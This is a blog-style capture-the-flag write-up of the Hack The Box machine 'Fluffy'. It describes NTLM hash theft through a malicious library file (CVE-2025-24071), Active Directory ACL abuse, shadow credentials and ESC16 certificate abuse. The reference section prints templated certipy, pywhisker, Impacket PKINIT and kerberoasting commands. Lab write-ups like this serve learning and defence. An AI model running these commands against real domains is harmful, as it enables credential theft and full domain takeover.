---
title: "HTB: Fluffy"
date: 2026-11-06
draft: false
tags: ["htb", "windows", "active-directory", "ntlm", "acl-abuse", "esc16", "shadow-credentials"]
cover:
  image: /images/htb-fluffy-cover.jpg
  alt: "A library file casting a long shadow over a Windows domain, phosphor green on black"
  relative: false
---

Fluffy. Windows, easy, retired. The chain in one line: NTLM theft via CVE-2025-24071 → ACL abuse → shadow credentials → ESC16.

But the box isn't really about the chain. It's about a domain that hands you the next step every time you look at it properly — and about certipy not working, so you do it by hand instead.

## Initial access

Pre-given credentials for a low-priv user. There was an SMB share with a document showing CVEs that needed to be patched on the machine. One of the critical rated ones was CVE-2025-24071. This CVE triggers external NetNTLM authentication when a malicious `.ms-library` file (or a `.zip` containing a `.ms-library` file) is viewed. Public PoC available for creating the malicious file.

The pre-given user had write access to the SMB share, so I put the `.ms-library` file there and started responder. Soon got a hash in responder from a different user, crackable.

Using BloodHound, it appeared this new user was a member of a group with GenericAll over another group, Service Accounts, that in turn had GenericWrite over some service accounts (`winrm_svc`, `ldap_svc`, `ca-svc`). `winrm_svc` was a member of Remote Management Users, so I added the user to Service Accounts, then performed a shadow credential attack on `winrm_svc`. Certipy wasn't working for some reason, so I used several other tools — steps described in the New Information section below.

## Root: ESC16

I tried many things to escalate, including lateral movement to a couple of other accounts. Certipy showed a potential ESC16 vulnerability, so I went through the steps of exploiting this, and after tweaking commands many times, finally got shell as Administrator.

---

## Takeaways

Two habits paid off here. First, when BloodHound shows you a clean ACL chain, follow it — GenericAll over a group that has GenericWrite over service accounts is the whole box, if you just walk it step by step. Second, when your favourite tool won't cooperate, don't sit there fighting it: the shadow credential attack works just as well with pywhisker plus the Impacket PKINIT tools, and knowing that fallback is what actually got the shell.

And the CVE is worth remembering on its own: a file that triggers authentication just by being *viewed* is a foothold you can plant anywhere you have write access.

---

## Reference

A few things worth keeping from this box's notes:

**ESC16 — what it is.** The CA has the `SZOID_NTDS_CA_SECURITY_EXT` OID disabled, meaning UPN → SAN mapping is trusted at auth time. This means that if you have write access over an account that can register for a certificate, you can change its UPN to "administrator", register for a certificate, then change it back. The certificate will give you administrator access.

Exploitation steps (where `<auth-user>` has write access over `<controlled-user>`, who can register for a cert):

```bash
# Change the controlled user's UPN to administrator
certipy account -u <auth-user> -p <pass> -target <domain> -upn administrator -user <controlled-user> update

# Verify
certipy account -u <auth-user> -p <pass> -dc-ip <ip> -user <controlled-user> read

# Request a certificate as administrator
certipy req -dc-ip <ip> -u administrator -p <controlled-user-pass> -target <domain> -ca <ca-name> -template User
# <ca-name> can be found with certipy.

# Change the UPN back
certipy account -u <auth-user> -p <pass> -target <domain> -upn <original-upn> -user <controlled-user> update

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -domain <domain> -dc-ip <ip>
```

Certipy tips from this box:

- On labs in particular, if you're getting a certipy error that says no route to host, try specifying the target IP with `-target-ip <dc-ip>`.
- For PTH with certipy, use `-hashes :<nt-hash>`.
- If you're getting a username mismatch error, make sure you reverted the UPN.

**Shadow credentials without certipy.** Pywhisker and the Impacket PKINIT tools, if certipy isn't working:

```bash
pywhisker -d <domain> -u <user> -p <pass> --target <target-account> --action add
python getTGTpkinit.py -cert-pfx <pfx-from-prev-output> -pfx-pass <pass-from-prev-output> -dc-ip <ip> file.ccache
KRB5CCNAME=file.ccache python getnthash.py -key <key-from-prev-output> <domain>/<target-user>
```

**BloodHound tips.** Use BloodHound to get a user list if ldapsearch is being weird with Kerberos. You can use `| jq .` and grep on `user.json`. Try using rusthound-ce instead of bloodhound-python — it captures certificate data. You can use pre-built searches in the Cypher tab of BloodHound. It is worth running certipy from an account that may have permissions for ESCs; other accounts will not show them as vulnerable.

**Kerberoasting check.** To check for kerberoasting, instead of Impacket GetUserSPNs, you can just use: `nxc ldap <ip> -u <user> -p <pass> --kerberoasting outfile.txt`

**UPN change CONSTRAINT error.** If you're trying to change the UPN of a user and got a CONSTRAINT error, try using `@<domain>` in the UPN, or leaving it off.
